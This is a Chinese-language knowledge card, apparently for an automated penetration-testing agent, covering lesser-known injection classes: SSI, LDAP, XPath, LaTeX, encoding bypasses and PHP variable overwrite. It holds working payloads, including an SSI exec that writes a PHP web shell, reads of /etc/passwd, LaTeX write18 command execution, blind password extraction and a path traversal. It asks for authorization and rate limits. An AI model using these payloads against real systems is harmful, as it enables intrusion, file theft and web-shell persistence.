---
id: extra-injection-types
title: 扩展注入面（SSI/LDAP/XPath/LaTeX/变量覆盖/编码变换）
tags: 注入,SSI,LDAP,XPath,LaTeX,编码变换,s4
---
# 扩展注入面（扫描器盲区）

**定位**：SQLi/NoSQL 之外的注入类——特征是"参数进入非 SQL 的解析器"。每一类都先探针判据再利用。

## 一、SSI（服务端包含）

探针：`<!--#echo var="DATE_LOCAL"-->` 被解析为日期 = SSI 开启。利用：上传 `shell.shtml`；`<!--#exec cmd="echo '<?php system($_GET[c]);?>' > /var/www/html/x.php"-->` 写 shell 链；`<!--#include virtual="/etc/passwd"-->` 文件读。

## 二、LDAP 注入

过滤绕过：`admin)(&)`、`*)(uid=*))(|(uid=*`；**null byte `%00` 截断密码校验**；通配符逐字符提取：`(&(uid=admin)(password=s*))` → `s*`→`se*`→… 恢复密码；OR 注入 `(cn=*)` 全量泄露。判据：括号闭合差异/过滤字符差异。

## 三、XPath 盲注七步法

`count(//user)` → `string-length(name(//*[1]))` → 逐节点名 → 逐字符 `substring(//user[1]/password,i,1)` 布尔判断（附 XPath 2.0 `matches/tokenize`）。

## 四、LaTeX 注入

`\input{/etc/passwd}` 文件读；`\immediate\write18{id}` RCE（需 --shell-escape）；MathJax `\href{javascript:alert(1)}`。场景：论文/公式渲染、Markdown 导出 PDF。

## 五、编码变换判据（通用绕过武器库）

NFKC 全角 `Ａ`→`A`（注册同名占位）；MySQL collation 使 `'ᵃdmin'` 匹配 `admin`；Punycode 同形域绕 SSRF/重定向校验；`%252e%252e%252f` 双重解码差。**判据**：变换前后行为差异即命中。

## 六、PHP 变量覆盖

`extract($_GET)` 无第二参、`parse_str` 无第二参、`import_request_variables`、`$GLOBALS[admin]=1`（PHP<8.1）→ 直接覆盖认证变量。

## 七、纪律

LDAP/XPath 探针限速（逐字符提取请求量大，需授权明确）；LaTeX write18 仅做 id 级证明；全部命中走 record_finding + update_coverage。

### 探针与环境补全

LaTeX 补：`\lstinputlisting{/etc/passwd}`（带行号）；`\newread\file \openin\file=/etc/passwd \read\file to\line`（逐行）；`\input{|id}`（部分引擎管道执行）；探针 `$\frac{1}{2}$` 是否渲染。Base64 解码歧义：WAF 解码器与应用解码器（charset/padding）不一致，畸形 padding 可过 WAF 但应用正常解码——判据=同一串两侧行为差异。PHP 变量覆盖白盒点：`$$var`（可变变量）；组合技 `extract($_GET); include($template.".php");` → `?template=../../../etc/passwd%00`；`EXTR_SKIP` 不覆盖已有但仍创建新全局。SSI 环境前置判据：Apache 需 `mod_include`+`Options +Includes`；Nginx 需 `ssi on;`；IIS 装 SSI 特性——探针不中先核环境再 ruled_out。LDAP 闭合变体补两枚：`zhang)(|(&`（恒真闭合）、`admin)(!(&(1=0))`（取反闭合）。